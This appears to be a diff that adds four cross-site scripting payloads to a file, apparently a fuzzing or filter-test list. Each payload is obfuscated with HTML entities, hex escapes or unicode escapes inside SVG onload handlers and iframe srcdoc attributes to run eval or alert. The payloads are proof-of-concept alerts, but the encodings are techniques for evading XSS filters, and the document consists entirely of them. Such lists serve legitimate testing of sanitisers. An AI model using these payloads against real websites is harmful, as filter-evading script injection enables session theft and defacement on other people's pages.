@@ -1,0 +1,4 @@
+<svg onload='&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;'>
+<iframe srcdoc="<script>setTimeout(function(){window['\x61\x6c\x65\x72\x74'](1)},0)</script>"></iframe>
+<svg onload="window['\u0065\u0076\u0061\u006c']('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029')">
+<iframe srcdoc="<svg onload=window['\u0065\u0076\u0061\u006c']('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029')>"></iframe>
